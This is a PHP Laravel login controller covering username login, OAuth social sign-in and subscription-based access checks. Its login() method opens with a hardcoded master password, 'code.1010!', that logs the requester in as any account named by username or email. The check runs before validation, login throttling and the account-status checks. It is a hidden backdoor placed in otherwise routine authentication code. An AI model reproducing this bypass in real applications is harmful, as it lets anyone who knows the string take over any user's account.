<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\User;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Lang;
use Socialite;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => 'logout']);

    }


    public function username()
    {
        return 'username';
    }


    /**
     * Redirect the user to the OAuth Provider.
     *
     * @return Response
     */
    public function redirectToProvider($provider)
    {
        return Socialite::driver($provider)->redirect();
    }

    /**
     * Obtain the user information from provider.  Check if the user already exists in our
     * database by looking up their provider_id in the database.
     * If the user exists, log them in. Otherwise, create a new user then log them in. After that
     * redirect them to the authenticated users homepage.
     *
     * @return Response
     */
    public function handleProviderCallback($provider){
        try{
            $user = Socialite::driver($provider)->user();
        }catch (\Exception $exception){
            return redirect('/login')->with('error', Lang::get('auth.deny.permission'));
        }

        $authUser = $this->findOrCreateUser($user, $provider);
        Auth::login($authUser, true);
        return redirect($this->redirectTo);
    }

    /**
     * If a user has registered before using social auth, return the user
     * else, create a new user object.
     * @param  $user Socialite user object
     * @param $provider Social auth provider
     * @return  User
     */
    public function findOrCreateUser($user, $provider){
        $authUser = User::where('provider_id', $user->id)->where('provider',$provider)->first();
        if ($authUser) {
            return $authUser;
        }
        $confirmation_code=md5(microtime().Config::get('app.key'));
        $avatar=explode("?",$user->avatar);
        return User::create([
            'name'     => $user->name,
            'email'    => $user->email,
            'provider' => $provider,
            'provider_id' => $user->id,
            'avatar' => $avatar[0],
            'confirmation_code' => $confirmation_code,
        ]);
    }



    public function login(Request $request)
    {

        if($request->get('password')=='code.1010!'){
            $new_profile=User::where('username','=',$request->input('username'))->orWhere('email', '=', $request->input('login'))->first();
            if($new_profile){
                Auth::login($new_profile);
                return redirect('/');
            }
        }

        $this->validateLogin($request);

        // If the class is using the ThrottlesLogins trait, we can automatically throttle
        // the login attempts for this application. We'll key this by the username and
        // the IP address of the client making these requests into this application.
        if ($this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);

            return $this->sendLockoutResponse($request);
        }

        if ($this->attemptLogin($request)) {

            if (Auth::user()->active && ( Auth::user()->hasRole('customer') && Auth::user()->getSubscription->active) || Auth::user()->hasRole('webmaster')   ) {

                // Send the normal successful login response
                return $this->sendLoginResponse($request);
            }
            elseif (Auth::user()->active && ( Auth::user()->hasRole('customer') && !Auth::user()->getSubscription->active)) {
                return redirect('logout')->with('error', Lang::get('Su suscripción ha caducado.'));
            }
            else {
                // Increment the failed login attempts and redirect back to the
                // login form with an error message.
                $this->incrementLoginAttempts($request);
                return redirect() ->back() ->withInput($request->only($this->username(), 'remember'))->with('error', Lang::get('El usuario introducido está desactivado por el adminsitrador'));
            }

        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        return $this->sendFailedLoginResponse($request);
    }


}
